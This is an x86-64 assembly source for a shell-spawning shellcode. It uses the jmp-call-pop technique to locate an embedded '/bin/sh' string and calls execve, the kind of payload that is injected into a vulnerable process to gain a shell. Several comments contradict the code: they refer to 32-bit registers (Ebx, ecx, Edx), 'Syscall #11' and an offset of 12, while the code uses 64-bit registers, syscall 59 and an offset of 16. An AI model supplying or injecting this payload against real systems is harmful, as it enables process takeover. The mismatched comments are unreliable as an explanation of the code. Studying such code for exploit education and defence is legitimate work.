global _start

section .text
_start:

    jmp short two     ; Jump down to the bottom for the call trick.
one:
    ; 64 bit System V ABI 
    ; system calls use: RDI/RSI/RDX/R10/R8/R9

    ; int execve(const char *filename, char *const argv [], char *const envp[])
    ;                     RDI                 RSI                RDX

    pop rdi           ; Ebx has the addr of the string.
    xor rax, rax      ; Put 0 into rax.
    mov [rdi+7], al   ; Null terminate the /bin/sh string.
    mov [rdi+8], rdi  ; Put addr from rbx where the AAAA is.
    mov [rdi+16], rax ; Put 32-bit null terminator where the BBBB is.
    lea rsi, [rdi+8]  ; Load the address of [rbx+8] into ecx for argv ptr.
    lea rdx, [rdi+16] ; Edx = rbx + 12, which is the envp ptr.
    add rax, 59        ; Syscall #11
    syscall

two:
    call one          ; Use a call to get string address.
    db '/bin/shXAAAAAAAABBBBBBBB'     ; The XAAAABBBB bytes aren't needed.
